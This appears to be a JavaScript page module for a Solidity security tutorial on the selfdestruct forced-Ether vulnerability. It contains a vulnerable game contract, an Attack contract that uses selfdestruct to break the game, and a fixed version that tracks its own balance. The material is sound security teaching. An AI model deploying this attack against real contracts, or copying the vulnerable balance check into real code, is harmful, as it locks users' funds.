// metadata
export const version = "0.8.26"
export const title = "Self Destruct"
export const description =
  "An example of how to delete your smart contract by calling selfdestruct in Solidity"
export const cyfrinLink =
  "https://www.cyfrin.io/glossary/self-destruct-hack-solidity-code-example"

export const keywords = ["hack", "security", "selfdestruct"]

export const codes = [
  {
    fileName: "ForceEther.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8vIFRoZSBnb2FsIG9mIHRoaXMgZ2FtZSBpcyB0byBiZSB0aGUgN3RoIHBsYXllciB0byBkZXBvc2l0IDEgRXRoZXIuCi8vIFBsYXllcnMgY2FuIGRlcG9zaXQgb25seSAxIEV0aGVyIGF0IGEgdGltZS4KLy8gV2lubmVyIHdpbGwgYmUgYWJsZSB0byB3aXRoZHJhdyBhbGwgRXRoZXIuCgovKgoxLiBEZXBsb3kgRXRoZXJHYW1lCjIuIFBsYXllcnMgKHNheSBBbGljZSBhbmQgQm9iKSBkZWNpZGVzIHRvIHBsYXksIGRlcG9zaXRzIDEgRXRoZXIgZWFjaC4KMi4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJHYW1lCjMuIENhbGwgQXR0YWNrLmF0dGFjayBzZW5kaW5nIDUgZXRoZXIuIFRoaXMgd2lsbCBicmVhayB0aGUgZ2FtZQogICBObyBvbmUgY2FuIGJlY29tZSB0aGUgd2lubmVyLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIGZvcmNlZCB0aGUgYmFsYW5jZSBvZiBFdGhlckdhbWUgdG8gZXF1YWwgNyBldGhlci4KTm93IG5vIG9uZSBjYW4gZGVwb3NpdCBhbmQgdGhlIHdpbm5lciBjYW5ub3QgYmUgc2V0LgoqLwoKY29udHJhY3QgRXRoZXJHYW1lIHsKICAgIHVpbnQyNTYgcHVibGljIGNvbnN0YW50IFRBUkdFVF9BTU9VTlQgPSA3IGV0aGVyOwogICAgYWRkcmVzcyBwdWJsaWMgd2lubmVyOwoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgcmVxdWlyZShtc2cudmFsdWUgPT0gMSBldGhlciwgIllvdSBjYW4gb25seSBzZW5kIDEgRXRoZXIiKTsKCiAgICAgICAgdWludDI1NiBiYWxhbmNlID0gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgICAgIHJlcXVpcmUoYmFsYW5jZSA8PSBUQVJHRVRfQU1PVU5ULCAiR2FtZSBpcyBvdmVyIik7CgogICAgICAgIGlmIChiYWxhbmNlID09IFRBUkdFVF9BTU9VTlQpIHsKICAgICAgICAgICAgd2lubmVyID0gbXNnLnNlbmRlcjsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gY2xhaW1SZXdhcmQoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUobXNnLnNlbmRlciA9PSB3aW5uZXIsICJOb3Qgd2lubmVyIik7CgogICAgICAgIChib29sIHNlbnQsKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogYWRkcmVzcyh0aGlzKS5iYWxhbmNlfSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIEV0aGVyR2FtZSBldGhlckdhbWU7CgogICAgY29uc3RydWN0b3IoRXRoZXJHYW1lIF9ldGhlckdhbWUpIHsKICAgICAgICBldGhlckdhbWUgPSBFdGhlckdhbWUoX2V0aGVyR2FtZSk7CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHBheWFibGUgewogICAgICAgIC8vIFlvdSBjYW4gc2ltcGx5IGJyZWFrIHRoZSBnYW1lIGJ5IHNlbmRpbmcgZXRoZXIgc28gdGhhdAogICAgICAgIC8vIHRoZSBnYW1lIGJhbGFuY2UgPj0gNyBldGhlcgoKICAgICAgICAvLyBjYXN0IGFkZHJlc3MgdG8gcGF5YWJsZQogICAgICAgIGFkZHJlc3MgcGF5YWJsZSBhZGRyID0gcGF5YWJsZShhZGRyZXNzKGV0aGVyR2FtZSkpOwogICAgICAgIHNlbGZkZXN0cnVjdChhZGRyKTsKICAgIH0KfQo=",
  },
  {
    fileName: "PreventForceEther.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IEV0aGVyR2FtZSB7CiAgICB1aW50MjU2IHB1YmxpYyBjb25zdGFudCBUQVJHRVRfQU1PVU5UID0gNyBldGhlcjsKICAgIHVpbnQyNTYgcHVibGljIGJhbGFuY2U7CiAgICBhZGRyZXNzIHB1YmxpYyB3aW5uZXI7CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA9PSAxIGV0aGVyLCAiWW91IGNhbiBvbmx5IHNlbmQgMSBFdGhlciIpOwoKICAgICAgICBiYWxhbmNlICs9IG1zZy52YWx1ZTsKICAgICAgICByZXF1aXJlKGJhbGFuY2UgPD0gVEFSR0VUX0FNT1VOVCwgIkdhbWUgaXMgb3ZlciIpOwoKICAgICAgICBpZiAoYmFsYW5jZSA9PSBUQVJHRVRfQU1PVU5UKSB7CiAgICAgICAgICAgIHdpbm5lciA9IG1zZy5zZW5kZXI7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGNsYWltUmV3YXJkKCkgcHVibGljIHsKICAgICAgICByZXF1aXJlKG1zZy5zZW5kZXIgPT0gd2lubmVyLCAiTm90IHdpbm5lciIpOwogICAgICAgIHVpbnQyNTYgYW1vdW50ID0gYmFsYW5jZTsKICAgICAgICBiYWxhbmNlID0gMDsKICAgICAgICAoYm9vbCBzZW50LCkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGFtb3VudH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CiAgICB9Cn0K",
  },
]

const html = `<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>
<p><code>selfdestruct</code> sends all remaining Ether stored in the contract to a
designated address.</p>
<h3>Vulnerability</h3>
<p>A malicious contract can use <code>selfdestruct</code> to
force sending Ether to any contract.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>
<span class="hljs-comment">// Players can deposit only 1 Ether at a time.</span>
<span class="hljs-comment">// Winner will be able to withdraw all Ether.</span>

<span class="hljs-comment">/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decide to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> TARGET_AMOUNT <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        <span class="hljs-keyword">uint256</span> balance <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> TARGET_AMOUNT, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> TARGET_AMOUNT) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);

        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherGame etherGame;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">EtherGame _etherGame</span>) </span>{
        etherGame <span class="hljs-operator">=</span> EtherGame(_etherGame);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-comment">// You can simply break the game by sending ether so that</span>
        <span class="hljs-comment">// the game balance &gt;= 7 ether</span>

        <span class="hljs-comment">// cast address to payable</span>
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(etherGame));
        <span class="hljs-built_in">selfdestruct</span>(addr);
    }
}
</code></pre><h3>Preventative Techniques</h3>
<p>Don&#39;t rely on <code>address(this).balance</code></p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> TARGET_AMOUNT <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> balance;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        balance <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> TARGET_AMOUNT, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> TARGET_AMOUNT) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);
        <span class="hljs-keyword">uint256</span> amount <span class="hljs-operator">=</span> balance;
        balance <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}
</code></pre>`

export default html
